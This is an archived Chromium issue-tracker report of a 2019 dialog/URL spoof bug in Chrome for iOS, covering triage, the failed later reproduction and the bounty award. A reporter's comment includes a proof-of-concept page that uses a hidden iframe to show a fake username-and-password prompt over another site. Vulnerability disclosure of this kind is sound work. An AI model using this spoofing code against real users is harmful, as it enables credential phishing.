# Chrome v74 JS dialog description Spoof vulnerability on IOS

| Field | Value |
|-------|-------|
| **Issue ID** | [40094895](https://issues.chromium.org/issues/40094895) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | UI>Browser>Navigation |
| **Platforms** | iOS |
| **Reporter** | ev...@gmail.com |
| **Assignee** | eu...@chromium.org |
| **Created** | 2019-05-07 |
| **Bounty** | $500.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36

Steps to reproduce the problem:
1. PoC: https://server.n0tr00t.com/chrome/74_mobile_url_spoof.html
2. Click test <a> tag
3. We'll see the effect of a successful hijacking

What is the expected behavior?
N/A

What went wrong?
Hide the prompt address using iframe, and then complete the spoofing of the URL Spoof.

Did this work before? N/A 

Chrome version: 74.0.3729.131  Channel: stable
OS Version: OS X 10.14.0
Flash Version:

## Attachments

- [6541557238833_.pic_hd.jpg](attachments/6541557238833_.pic_hd.jpg) (image/jpeg, 471.6 KB)

## Timeline

### dt...@chromium.org (2019-05-07)

[Empty comment from Monorail migration]

### va...@chromium.org (2019-05-07)

Thanks for the report. Please attach the source code of the PoC with the bug.

### va...@chromium.org (2019-05-07)

Somewhat similar to https://crbug.com/chromium/931894.

### va...@chromium.org (2019-05-07)

[Empty comment from Monorail migration]

### ev...@gmail.com (2019-05-08)

#2 

```

<html>
  <body>
    <script>
    function pwn() {
        win = window.open('https://expired.badssl.com', '_self')
        setTimeout(`document.getElementById("nop").src = 'javascript:prompt("In order to access fake_website.com,Please enter your username and password", "Username / Password");';`, 3333);
    }
    </script>

    <iframe style="display:none" id="nop" src=""></iframe>

    <a href="#" onclick="pwn();"><h1>ClickME :)</h1></a>
  </body>
</html>
```

### sh...@chromium.org (2019-05-08)

Thank you for providing more feedback. Adding the requester to the cc list.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-05-08)

[Empty comment from Monorail migration]

### eu...@chromium.org (2019-05-08)

[Empty comment from Monorail migration]

### eu...@chromium.org (2019-05-17)

[Empty comment from Monorail migration]

### kk...@chromium.org (2019-05-20)

[Empty comment from Monorail migration]

### me...@chromium.org (2019-06-17)

This looks navigation related as well.

[Monorail components: UI>Browser>Navigation]

### sh...@chromium.org (2019-09-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-23)

[Empty comment from Monorail migration]

### li...@chromium.org (2019-11-25)

kkhorimoto@, do you have cycles to work on this? Trying to close out some low severity security bugs this quarter :)

### sh...@chromium.org (2019-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-02-05)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-20)

[Empty comment from Monorail migration]

### kk...@chromium.org (2020-06-05)

Marking as untriaged since I'm no longer working on Chrome.

### kk...@chromium.org (2020-06-05)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-16)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-26)

[Empty comment from Monorail migration]

### aj...@google.com (2020-09-25)

Marshal ping - it would be great if this security bug could have an owner!

### eu...@chromium.org (2020-09-28)

I can no longer repro the bug. The dialog just does not show up with Chrome 87.0.4277.0 on iOS 13.5. Ali, Gauther, would you mind double checking if you can repro?

### aj...@chromium.org (2020-09-28)

I cannot repro this either (on iOS 14.0).

### ga...@chromium.org (2020-09-29)

Same (iOS 13.5)

### [Deleted User] (2020-09-29)

[Empty comment from Monorail migration]

### ad...@google.com (2020-10-01)

eugenebut@ please could you let us know if this was fixed as part of iOS or as part of Chrome for iOS? If this is a duplicate of another bug that was fixed, please could you work out which? Sorry - it's important we get this right so that we pay VRP rewards in the right circumstances and credit the right reporters in the release notes.

### eu...@chromium.org (2020-10-01)

I could not repro the bug and I don't know if the bug was reproducible when it was filed in the first place. 

The bug report does not have iOS version, but when the bug was filed there was no iOS 13, so I assume that bug was filed against iOS 12. Unfortunately I don't have a good way to test this on iOS 12, but I don't think there were any Chrome-specific fixes. If the bug was reproducible, then the bug was most likely fixed in iOS, not in Chrome.

It's really unfortunate that bug was ignored for more than a year after being assigned and I apologize for that.

### ad...@google.com (2020-10-05)

[Empty comment from Monorail migration]

### ad...@google.com (2020-10-05)

Thanks Eugene. We'll discuss at the VRP panel.

### ad...@google.com (2020-10-07)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-10-07)

The VRP panel discussed this situation and has decided to award $500 for this report.

### ad...@google.com (2020-10-08)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-16)

evi1m0.bat@gmail.com given the comment at https://crbug.com/chromium/960357#c29 that it was most likely fixed in iOS, I am not permitted to allocate a CVE for this one. Sorry about that.

### [Deleted User] (2021-01-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/960357?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094895)*
